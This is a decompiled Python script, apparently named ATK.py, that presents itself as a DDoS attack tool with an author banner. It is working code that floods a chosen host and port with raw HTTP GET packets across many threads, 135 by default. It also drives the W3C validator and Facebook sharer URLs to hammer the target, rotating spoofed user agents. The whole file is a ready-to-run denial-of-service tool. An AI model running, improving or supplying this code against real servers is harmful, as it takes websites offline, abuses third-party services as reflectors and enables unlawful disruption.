# uncompyle6 version 3.7.3
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.

# Embedded file name: ATK.py
# Compiled at: 2020-08-20 10:21:55
# Size of source mod 2**32: 5293 bytes
from queue import Queue
from optparse import OptionParser
import os, time, sys, socket, threading, logging, urllib.request, random
u = '\x1b[1;35m'
b = '\x1b[1;36m'
m = '\x1b[31;1m'
k = '\x1b[1;33m'
p = '\x1b[1;37m'

def wr(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008333333333333333)


def user_agent():
    global uagent
    uagent = []
    uagent.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14')
    uagent.append('Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0')
    uagent.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    uagent.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    uagent.append('Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7')
    uagent.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    uagent.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    return uagent


def my_bots():
    global bots
    bots = []
    bots.append('http://validator.w3.org/check?uri=')
    bots.append('http://www.facebook.com/sharer/sharer.php?u=')
    return bots


def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print('\x1b[94mbot is hammering...\x1b[0m')
            time.sleep(0.1)

    except:
        time.sleep(0.1)


def down_it(item):
    global data
    try:
        while True:
            packet = str('GET / HTTP/1.1\nHost: ' + host + '\n\n User-Agent: ' + random.choice(uagent) + '\n' + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print('\x1b[92m', time.ctime(time.time()), '\x1b[0m \x1b[94m <--packet sent! Attacking--> \x1b[0m')
            else:
                s.shutdown(1)
                print('\x1b[91mshut<->down\x1b[0m')
            time.sleep(0.1)

    except socket.error as e:
        try:
            print('\x1b[91mno connection! server maybe down\x1b[0m')
            time.sleep(0.1)
        finally:
            e = None
            del e


def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + 'http://' + host)
        w.task_done()


def usage():
    os.system('clear')
    print(m)
    wr(f" ____  ____   ___  ____       {p}_  _____ _____  _    ____ _  __\n{m}|  _ \\|  _ \\ / _ \\/ ___|     {p}/ \\|_   _|_   _|/ \\  / ___| |/ / \n{m}| | | | | | | | | \\___ \\    {p}/ _ \\ | |   | | / _ \\| |   | ' /  \n{m}| |_| | |_| | |_| |___) |  {p}/ ___ \\| |   | |/ ___ \\ |___| . \\  \n{m}|____/|____/ \\___/|____/  {p}/_/   \\_\\_|   |_/_/   \\_\\____|_|\\_\\ \n\t\x1b[37;1m\n\t=============================\n       \t\x1b[0;32mAuthor\x1b[37;1m : \x1b[0;36m MRROBO28\n\t\x1b[0;32mgithub\x1b[37;1m : \x1b[0;36mhttps://github.com/MRROBO28\n\t\x1b[0;32mYoutube\x1b[37;1m : \x1b[0;36m MR_ROBO.28\x1b[37;1m\n        ============================= \n\t\x1b[1;33musage : python ATK.py [-s] [-p] [-t]\n\t-h : help\n\t-s : server ip\n\t-p : port default 80\n\t-t : turbo default 135 \x1b[0m")
    pil = input(u + 'cari IP website dulu?' + k + '[y/n] ' + b)
    if pil == 'y':
        os.system('sh ping.sh')
    else:
        if pil == 'n':
            sys.exit()
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    optp = OptionParser(add_help_option=False, epilog='Hammers')
    optp.add_option('-q', '--quiet', help='set logging to ERROR', action='store_const', dest='loglevel', const=(logging.ERROR), default=(logging.INFO))
    optp.add_option('-s', '--server', dest='host', help='attack to server ip -s ip')
    optp.add_option('-p', '--port', type='int', dest='port', help='-p 80 default 80')
    optp.add_option('-t', '--turbo', type='int', dest='turbo', help='default 135 -t 135')
    optp.add_option('-h', '--help', dest='help', action='store_true', help='help you')
    opts, args = optp.parse_args()
    logging.basicConfig(level=(opts.loglevel), format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    else:
        if opts.host is not None:
            host = opts.host
        else:
            usage()
        if opts.port is None:
            port = 80
        else:
            port = opts.port
        if opts.turbo is None:
            thr = 135
        else:
            thr = opts.turbo


headers = open('headers.txt', 'r')
data = headers.read()
headers.close()
q = Queue()
w = Queue()
if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print('\x1b[92m', host, ' port: ', str(port), ' turbo: ', str(thr), '\x1b[0m')
    print('\x1b[94mPlease wait...\x1b[0m')
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        try:
            print('\x1b[91mcheck server ip and port\x1b[0m')
            usage()
        finally:
            e = None
            del e

    else:
        while True:
            for i in range(int(thr)):
                t = threading.Thread(target=dos)
                t.daemon = True
                t.start()
                t2 = threading.Thread(target=dos2)
                t2.daemon = True
                t2.start()

            start = time.time()
            item = 0
            while True:
                if item > 1800:
                    item = 0
                    time.sleep(0.1)
                item = item + 1
                q.put(item)
                w.put(item)

            q.join()
            w.join()

# global item ## Warning: Unused global
# okay decompiling z.pyc
